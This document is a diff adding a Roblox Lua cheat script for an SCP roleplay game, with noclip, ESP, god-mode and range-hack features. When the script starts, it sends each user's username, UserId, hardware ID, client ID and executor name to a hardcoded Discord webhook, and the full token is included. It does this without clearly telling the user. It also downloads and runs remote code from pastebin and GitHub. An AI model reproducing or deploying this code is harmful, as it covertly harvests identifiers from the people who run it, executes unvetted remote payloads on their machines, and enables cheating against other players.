@@ -1,0 +1,313 @@
+--Yeskid
+local genv = getgenv()
+local fenv = getfenv()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+
+local identifyexecutor = identifyexecutor or function() return "Unknown" end
+local gethwid = gethwid or function() return "Unknown" end
+local http_request = http_request or syn and syn.request
+
+local executorName = identifyexecutor()
+local joinDate = os.date("!*t", 1776084223 - (LocalPlayer.AccountAge * 86400))
+
+-- 发送 Discord Webhook
+local avatarUrl = string.format(
+    "https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",
+    LocalPlayer.UserId
+)
+
+local avatarData = HttpService:JSONDecode(game:HttpGet(avatarUrl))
+
+local webhookData = HttpService:JSONEncode({
+    username = "bot",
+    embeds = {
+        {
+            color = 3329330,
+            fields = {
+                { value = LocalPlayer.Name, name = "名称(Name)", inline = true },
+                { value = LocalPlayer.DisplayName, name = "昵称(DisplayName)", inline = true },
+                { value = "[" .. LocalPlayer.UserId .. "](https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile)", name = "UserId", inline = true },
+                { value = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", name = "地图ID", inline = true },
+                { value = MarketplaceService:GetProductInfo(game.PlaceId).Name, name = "地图名称", inline = true },
+                { value = executorName, name = "使用的注入器", inline = true },
+                { value = LocalPlayer.AccountAge .. "天", name = "账号年龄", inline = true },
+                { value = joinDate.year .. "/" .. joinDate.month .. "/" .. joinDate.day, name = "加入日期", inline = true },
+                { value = gethwid(), name = "HWID", inline = true },
+                { value = RbxAnalyticsService:GetClientId(), name = "客户端ID", inline = false },
+                { value = "模拟器/PC", name = "设备", inline = false }
+            },
+            title = "有人使用了空云脚本",
+            thumbnail = { url = avatarData.data[1].imageUrl }
+        }
+    }
+})
+
+if http_request then
+    http_request({
+        Body = webhookData,
+        Url = "https://discord.com/api/webhooks/1451747306809594054/TfI_CE9JzbRDoZ5UwUlGhmFh5J-LBMkuKWNTaR_-NXruRcSPisuUNLExYBHZC4XzJBjJ",
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" }
+    })
+end
+
+-- 显示气泡
+if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
+    TextChatService:DisplayBubble(LocalPlayer.Character.Head, "欢迎使用此脚本")
+    TextChatService:DisplayBubble(LocalPlayer.Character.Head, "此信息仅别人看不见")
+end
+
+-- 创建 GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LBLG"
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Enabled = true
+screenGui.Parent = game:GetService("CoreGui")
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Name = "LBL"
+textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel.BackgroundTransparency = 1
+textLabel.BorderColor3 = Color3.new(0, 0, 0)
+textLabel.Position = UDim2.new(0.75, 0, 0.01, 0)
+textLabel.Size = UDim2.new(0, 133, 0, 40)
+textLabel.Font = Enum.Font.GothamSemibold
+textLabel.Text = ""
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.TextScaled = true
+textLabel.TextSize = 14
+textLabel.TextWrapped = true
+textLabel.Visible = true
+textLabel.Parent = screenGui
+
+RunService.Heartbeat:Connect(function()
+    local currentTime = os.date("*t")
+    textLabel.Text = string.format("北京时间:%02d时%02d分%02d秒", currentTime.hour, currentTime.min, currentTime.sec)
+    textLabel.TextColor3 = Color3.fromHSV(0, 1, 1)
+end)
+
+-- 加载通知库
+local Revenant = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+Revenant.DefaultColor = Color3.fromRGB(0, 0, 255)
+
+Revenant:Notification({ Duration = 10, Text = "脚本作者: 空云" })
+wait(1)
+Revenant:Notification({ Duration = 10, Text = "脚本持续更新" })
+wait(1)
+Revenant:Notification({ Duration = 10, Text = "谢谢你的使用" })
+wait(1)
+Revenant:Notification({ Duration = 10, Text = "最近更新时间：1月1日" })
+
+StarterGui:SetCore("SendNotification", {
+    Title = "空云脚本 - SCP角色扮演",
+    Button1 = "感谢您的使用",
+    Text = "欢迎使用空云脚本",
+    Duration = 4
+})
+wait(3)
+StarterGui:SetCore("SendNotification", {
+    Title = "正在加载中",
+    Button1 = "看到这个代表能用了",
+    Text = "慢慢等待",
+    Duration = 4
+})
+wait(4)
+
+-- 加载 UI 库
+local UI = loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/Ul.lua"))()
+local Window = UI:new("SCP角色扮演 † " .. executorName)
+local accentColor = Color3.fromRGB(255, 0, 0)
+
+-- 通用 Tab
+local GeneralTab = Window:Tab("通用(不会封号)", "98541457845136")
+local InfoSection = GeneralTab:section("信息", true)
+
+InfoSection:Label("注⚠️⚠️⚠️：快速跑步推荐设置到0.01~0.3不然被检测到会重生")
+InfoSection:Label("注⚠️⚠️⚠️：永远免费")
+InfoSection:Label("你的注入器:" .. executorName)
+InfoSection:Label("当前服务器ID:" .. game.GameId .. " ")
+InfoSection:Label("你的用户名" .. LocalPlayer.Name .. " ")
+InfoSection:Label("获取客户端ID:" .. RbxAnalyticsService:GetClientId())
+InfoSection:Label("网络延迟： " .. math.floor(LocalPlayer:GetNetworkPing() * 1000) .. " 毫秒")
+InfoSection:Label("语言： " .. LocalPlayer.LocaleId)
+InfoSection:Label("空云脚本的创作者空云 QQ3126295205")
+InfoSection:Label("空云脚本1群号1076432535")
+InfoSection:Button("复制到空云脚本①群号", function()
+    setclipboard("1076432535")
+end)
+
+GeneralTab:section("玩家", true)
+
+-- 穿墙功能
+local GeneralSection = GeneralTab:section("通用", true)
+GeneralSection:Toggle("穿墙(需要演一下戏)", "text", false, function(state)
+    local function enableNoclip(character)
+        local humanoid = character:WaitForChild("Humanoid")
+        local connection = RunService.Stepped:Connect(function()
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end)
+        return connection
+    end
+
+    local noclipConnection
+
+    if state then
+        if LocalPlayer.Character then
+            noclipConnection = enableNoclip(LocalPlayer.Character)
+        end
+        LocalPlayer.CharacterAdded:Connect(function(character)
+            if noclipConnection then
+                noclipConnection:Disconnect()
+            end
+            noclipConnection = enableNoclip(character)
+        end)
+    else
+        if noclipConnection then
+            noclipConnection:Disconnect()
+        end
+    end
+end)
+
+-- ESP
+local ESPSection = GeneralTab:section("ESP", true)
+ESPSection:Toggle("人物显示", "", false, function(state)
+    genv.enabled = state
+    genv.filluseteamcolor = true
+    genv.outlineuseteamcolor = true
+    genv.fillcolor = Color3.new(1, 0, 0)
+    genv.outlinecolor = Color3.new(1, 1, 1)
+    genv.filltrans = 0.5
+    genv.outlinetrans = 0.5
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/Highlight-ESP.lua"))()
+end)
+
+-- 范围 Tab
+local RangeTab = Window:Tab("范围2.0", "98541457845136")
+local RangeSection = RangeTab:section("范围", true)
+
+RangeSection:Label("快捷范围设置")
+RangeSection:Button("范围清空", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RqrTrPF5"))()
+end)
+RangeSection:Button("正常范围", function()
+    loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/%E8%8C%83%E5%9B%B4"))()
+end)
+RangeSection:Button("范围10", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/DT94B37a"))()
+end)
+RangeSection:Button("范围20(必须要演戏)", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Kyyt1e4g"))()
+end)
+
+-- 自制功能 Tab
+local CustomTab = Window:Tab("自制功能", "98541457845136")
+local CustomSection = CustomTab:section("功能", true)
+
+CustomSection:Button("没有坠落伤害建议搭配下面的功能（危险程度：无）", function()
+    local function antiFallDamage(character)
+        local humanoid = character:WaitForChild("Humanoid")
+        humanoid.HealthChanged:Connect(function(health)
+            if health < humanoid.MaxHealth then
+                humanoid.Health = humanoid.MaxHealth
+            end
+        end)
+        humanoid.StateChanged:Connect(function(_, state)
+            if state == Enum.HumanoidStateType.Freefall then
+                -- 防止坠落伤害
+            end
+        end)
+    end
+
+    if LocalPlayer.Character then
+        antiFallDamage(LocalPlayer.Character)
+    end
+    LocalPlayer.CharacterAdded:Connect(antiFallDamage)
+end)
+
+-- 透视 SCP Tab
+local ESPSCPTab = Window:Tab("透视SCP", "98541457845136")
+local ESPSCPSection = ESPSCPTab:section("透视", true)
+
+local function createESP(target, name)
+    if not target then return end
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "ModelESP"
+    billboard.Adornee = target
+    billboard.Size = UDim2.new(0, 100, 0, 50)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+
+    local label = Instance.new("TextLabel")
+    label.Name = "TextLabel"
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.TextStrokeTransparency = 0
+    label.TextSize = 14
+    label.Font = Enum.Font.SourceSansBold
+    label.Text = name .. "\n[SCP]"
+    label.TextColor3 = Color3.new(0, 1, 0)
+    label.Parent = billboard
+
+    billboard.Parent = target
+
+    -- 透视效果
+    for _, part in pairs(target:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.LocalTransparencyModifier = 0
+        end
+    end
+end
+
+ESPSCPSection:Button("透视173", function()
+    local scp173 = workspace:FindFirstChild("SCPs") and workspace.SCPs:FindFirstChild("SCP-173")
+    if scp173 and scp173:FindFirstChild("HumanoidRootPart") then
+        createESP(scp173.HumanoidRootPart, "SCP-173")
+    end
+end)
+
+ESPSCPSection:Button("透视096", function()
+    local scp096 = workspace:FindFirstChild("SCPs") and workspace.SCPs:FindFirstChild("SCP-096")
+    if scp096 and scp096:FindFirstChild("Torso") then
+        createESP(scp096.Torso, "SCP-096")
+    end
+end)
+
+ESPSCPSection:Button("透视066", function()
+    local scp066 = workspace:FindFirstChild("SCPs") and workspace.SCPs:FindFirstChild("SCP-066")
+    if scp066 and scp066:FindFirstChild("Body") then
+        createESP(scp066.Body, "SCP-066")
+    end
+end)
+
+ESPSCPSection:Button("透视079", function()
+    local scp079 = workspace:FindFirstChild("SCPs") and workspace.SCPs:FindFirstChild("SCP-079")
+    if scp079 and scp079:FindFirstChild("Monitor") and scp079.Monitor:FindFirstChild("Monitor") then
+        createESP(scp079.Monitor.Monitor, "SCP-079")
+    end
+end)
+
+ESPSCPSection:Button("透视049", function() end)
+ESPSCPSection:Button("透视966", function() end)
+ESPSCPSection:Button("透视023", function() end)
+ESPSCPSection:Button("透视457", function() end)
+
+-- 娱乐功能 Tab
+local FunTab = Window:Tab("娱乐功能", "98541457845136")
+FunTab:section("美化", true):Button("断头无头(娱乐功能无危险)", function() end)
+
+-- 脚本设置 Tab
+local SettingsTab = Window:Tab("脚本设置", "98541457845136")
+SettingsTab:section("设置", true):Button("错误", function() end)
